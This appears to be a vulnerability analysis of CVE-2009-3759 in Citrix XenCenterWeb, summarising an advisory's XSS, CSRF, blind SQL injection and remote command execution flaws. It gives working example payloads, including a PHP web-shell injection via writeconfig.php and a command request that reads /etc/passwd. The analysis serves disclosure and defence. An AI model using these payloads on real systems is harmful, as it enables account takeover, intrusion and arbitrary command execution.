Based on the provided content, here's an analysis of the vulnerabilities associated with CVE-2009-3759:

**Summary:**

The provided content is an advisory from Secure Network regarding multiple vulnerabilities in Citrix XenCenterWeb. While the advisory mentions multiple CVEs (CVE-2009-3757, CVE-2009-3758, CVE-2009-3759, CVE-2009-3760), this analysis focuses on the details provided for the vulnerabilities within the context of CVE-2009-3759, as the advisory does not delineate specific findings to each CVE. The content indicates that the application suffers from multiple vulnerabilities due to a lack of proper input validation.

**Vulnerabilities:**

1.  **Cross-Site Scripting (XSS):**
    *   **Root Cause:** Lack of sanitization of user-controlled input parameters.
    *   **Weakness:** The application does not properly sanitize input parameters in various scripts, allowing attackers to inject malicious scripts.
    *   **Attack Vectors:**
        *   `edituser.php`:  The `username` parameter is vulnerable.
            *   Example: `https://xencenterweb.loc/config/edituser.php?username=1<script>alert(document.cookie)</script>`
        *   `console.php`, `forcerestart.php`, `forcesd.php`: Multiple parameters are vulnerable.
            *   Examples:
                *   `https://xencenterweb.loc/console.php?location=1"><script>alert(document.cookie)</script><"&vmname=myVM`
                *   `https://xencenterweb.loc/console.php?location=1&sessionid=1"><script>alert(123)</script><"&vmname=myVM`
                *   `https://xencenterweb.loc/forcerestart.php?vmrefid=1"><script>alert(123)</script><"&vmname=myVM`

2.  **Cross-Site Request Forgery (CSRF):**
    *   **Root Cause:** The application does not properly protect against CSRF attacks.
    *   **Weakness:** Attackers can craft malicious links that, when clicked by an authenticated user, perform actions without the user's consent.
    *   **Attack Vectors:**
        *   `changepw.php`: Used to change an arbitrary user's password.
            *   Example: `https://xencenterweb.loc/config/changepw.php?username=[victim_username]&newpass=[attacker's_chosen_pwd]`
        *   `hardstopvm.php`: Used to hard stop a VM.
            *   Example: `https://xencenterweb.loc/hardstopvm.php?stop_vmref=[VMref]&stop_vmname=[VMname]`

3.  **SQL Injection:**
    *   **Root Cause:** The `username` parameter in `login.php` is not properly sanitized.
    *   **Weakness:** A Blind SQL Injection vulnerability exists, allowing attackers to potentially retrieve database schema and other sensitive data.
    *   **Attack Vector:**
        *   `login.php`: The `username` parameter is vulnerable to blind SQL injection.
            *   Example: `https://xencenterweb.loc/login.php?username=user' UNION SELECT if(user() LIKE 'root@%', benchmark(1000000,sha1('test')), 'false')/*`

4.  **Remote Command Execution:**
    *   **Root Cause:** The `writeconfig.php` script allows writing arbitrary data into `/usr/local/lib/php/include/config.ini.php`.
    *   **Weakness:** Improper access control to the configuration file allows an attacker to inject PHP code and execute arbitrary commands.
    *   **Attack Vectors:**
        *   `writeconfig.php`: Inject malicious PHP code into `config.ini.php`.
            *   Example: `https://xencenterweb.loc/config/writeconfig.php?pool1='; ?> <?php $cmd = $_REQUEST['cmd']; passthru($cmd); ?> <?php $xen = '`
            *  URL encoded version: `https://xencenterweb.loc/config/writeconfig.php?pool1=%27%3B%20%3F%3E%20%3C%3Fphp%20%24cmd%20%3D%20%24_REQUEST%5B%27cmd%27%5D%3B%20passthru%28%24cmd%29%3B%20%3F%3E%20%3C%3Fphp%20%24xen%20%3D%20%27`
        *   `console.php`: Execute commands through the injected code in the configuration file.
            *   Example: `https://xencenterweb.loc/console.php?cmd=cat%20/etc/passwd;`

**Impact of Exploitation:**

*   **XSS:** Allows attackers to execute arbitrary JavaScript in the victim's browser, potentially leading to session hijacking, information theft, and defacement.
*   **CSRF:** Enables attackers to perform unauthorized actions on behalf of a logged-in user, like changing passwords or stopping VMs.
*   **SQL Injection:** Provides attackers with the ability to read, modify, and delete data in the database, potentially leading to full system compromise and data breaches.
*  **Remote Command Execution:** Allows attackers to execute arbitrary commands on the server, leading to complete system compromise.

**Required Attacker Capabilities/Position:**

*   **XSS & CSRF:** Requires the attacker to trick a user into visiting a malicious link.
*  **SQL Injection:** Requires network access to the application, and the ability to craft malicious SQL queries via the login form.
*   **Remote Command Execution:** Requires the attacker to have network access to the application, as well as a valid user account to exploit. The web server must have `magic_quotes_gpc` off.

**Additional Notes:**

*   The advisory mentions that XSS and CSRF attacks can be executed with default PHP configurations where `register_globals=Off` and `magic_quotes_gpc=On`.
*   SQL injection and remote command execution require `magic_quotes_gpc` to be off on the webserver.
*   The advisory states that no official patch was provided by Citrix and the application was removed for download. They recommend common web application workarounds and advise running the application only inside the virtual appliance with properly configured web servers to mitigate the vulnerabilities.

In summary, CVE-2009-3759, as described in the advisory, highlights multiple critical vulnerabilities in Citrix XenCenterWeb, including XSS, CSRF, SQL injection, and remote command execution, primarily due to inadequate input validation and insecure configurations.
